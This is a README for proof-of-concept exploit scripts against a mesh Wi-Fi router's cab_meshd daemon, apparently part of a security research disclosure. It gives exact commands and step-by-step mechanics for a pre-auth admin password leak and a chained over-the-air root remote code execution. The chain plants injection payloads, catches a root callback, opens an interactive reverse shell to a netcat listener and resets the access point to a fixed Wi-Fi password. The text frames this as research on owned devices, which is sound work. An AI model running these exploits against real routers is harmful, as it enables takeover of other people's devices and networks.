# Proof-of-concept scripts

Pure Python 3 (stdlib only); no external packages. (A couple of helpers shell out to
`ip` to detect the attacker's local MAC/IP for the login nonce, with a hard-coded
fallback if it is absent.) Each script documents its mechanics in its module
docstring; the `cab_meshd` internals are in
[`../technical-appendix.md`](../technical-appendix.md).

> Run only against a device you own. The PoCs default to `192.168.31.1`; override
> with `--host`. All connect to the slow `cab_meshd` daemon, so they default to a
> 20 s timeout and retry the handshake through the daemon's connection-slot stall.

| Script | For | What it does |
|---|---|---|
| `init_router.py` | prep | Completes the setup wizard over the web API so `INITTED=YES` and `cab_meshd` opens 19553. SSID-only, non-invasive. Only needed to bring a *factory* unit into the normal, exploitable state. |
| `extract_admin.py` | **V1** | **The primary PoC.** Leak `web_passwd256` over 19553 (pre-auth), then mint an admin `stok`. **Read-only** against the target (never sends `type-7`). Confirmed on hardware. |
| `ota_rce.py` | **V1+V2** | **Full over-the-air root RCE.** Chains V1 (admin takeover) → V2 (root command execution via `encryption`-field injection). Starts an HTTP server, plants payloads, fires the trigger, catches the root callback, and opens an interactive reverse shell. **Confirmed on hardware.** |
| `handshake.py` | inspection | Full mesh protocol driver: forges the constant-key handshake to `ST_RUNNING` and prints the CAP's sync config (where `web_passwd256` appears). `--no-trigger` stops before `cap_init`. |
| `rce_poc.py` | **V2** | **Root command execution (CAP/LAN direct path).** base64'd `--cmd` in the type-4 **plant** (`body[0x90]`), full `4→5→7` handshake. Confirmed in emulation (root-owned file). ~4-char one-shot. Used as the trigger component of `ota_rce.py`. See `../chain2-root-rce.md`. |
| `exploit.py` | V2 (explanatory) | Documents the primitive verbosely, but its `body+0xe6` field theory does **not** hold on the CAP server path — **use `rce_poc.py`** for a landing payload. |

## Primary run (device you own)

```bash
# only if the unit is at factory defaults (19553 closed):
python3 init_router.py --host 192.168.31.1 --reboot

# V1 — non-destructive admin takeover:
python3 extract_admin.py --host 192.168.31.1
#   -> leaks web_passwd256 and prints a valid admin stok

# inspection — dump the sync config that leaks the verifier:
python3 handshake.py --host 192.168.31.1 --no-trigger
```

## V2 OTA — full over-the-air root RCE (confirmed on hardware)

```bash
# Terminal 1 — run the PoC (starts its own HTTP server on port 8000):
python3 ota_rce.py --host 192.168.31.1 --attacker 192.168.31.231

# Terminal 2 — catch the reverse shell:
nc -l -p 4444
```

`ota_rce.py` automates the full chain:
1. **V1** — leaks `web_passwd256`, mints admin `stok` (pre-auth, over Wi-Fi)
2. **Plant** — writes injection payloads into Wi-Fi `encryption` UCI keys via
   `set_wifi_without_restart`; preserves the original SSID
3. **Trigger** — fires `cap_init` via the `type-4→5→7` handshake
4. **Catch** — waits for the root callback (`/pwned?uid=0_user=root`) and the
   self-repair confirmation; the reverse shell connects to `nc` on port 4444

Be precise about what the self-repair does, because it changes your AP: `cap_init`
reconfigures the radios from the poisoned `encryption` values, and the payload then
overwrites any interface still holding the injected value with
**`encryption=psk2`, `key=meshpoc12345`**. So after a successful run the AP is
**WPA2 with that fixed password**, whatever it was before — including a unit that
started out open. Reconnect with:

```bash
nmcli dev wifi connect <ssid> password meshpoc12345
```

If you joined the **open** factory AP earlier in the run, the saved open profile for
that SSID shadows the new WPA2 one and `nmcli` fails with
`802-11-wireless-security.key-mgmt: property is missing`. Forget that profile first,
then retry. The reverse shell loop retries every 10 seconds, so if the `nc` listener
disconnects, starting a new one picks up a fresh shell.

**This is the headline result** — pre-auth root RCE over Wi-Fi with an interactive
shell, confirmed on physical hardware. See `../chain2-root-rce.md` for the full
technical breakdown.

## V2 — direct root command execution (CAP/LAN path, emulation)

```bash
python3 rce_poc.py --host 192.168.31.1 --cmd '>W'   # creates root-owned /W; ~4-char budget
```

Delivers `base64('`>W`')` in the type-4 plant, completes `4→5→7`, and the daemon
drives `mimesh_init`'s `eval` as root. Confirmed in emulation. It is a **one-shot**:
the first `cap_init` sets `NETMODE=whc_cap`, gating the sink until a factory reset.
The payload budget is ~4 characters here — for a full payload see the RE/WAN path in
`../chain2-root-rce.md`. `ota_rce.py` uses this as its trigger component.

## Safety / footprint
- `extract_admin.py` and `handshake.py --no-trigger` change nothing on the device.
- `ota_rce.py` modifies the device's Wi-Fi encryption UCI keys and triggers
  `cap_init`; the self-repairing payload restores valid encryption afterward, but the
  `NETMODE=whc_cap` gate persists until a factory reset.
- **If the unit is already spent, `ota_rce.py` stops before planting anything.** As
  soon as it holds an admin session it reads `NETMODE`, and refuses with
  `UNIT IS DISARMED: NETMODE=whc_cap` when the one-shot has already been consumed.
  Without that check the failure is silent and looks like a broken exploit: the plant
  succeeds, the trigger is accepted, and nothing ever calls back. Factory-reset the
  unit to re-arm.
- `rce_poc.py`/`exploit.py` send a `cap_init` trigger; on a gate-open unit that
  *could* execute the command if the sink fires, so choose the payload accordingly.
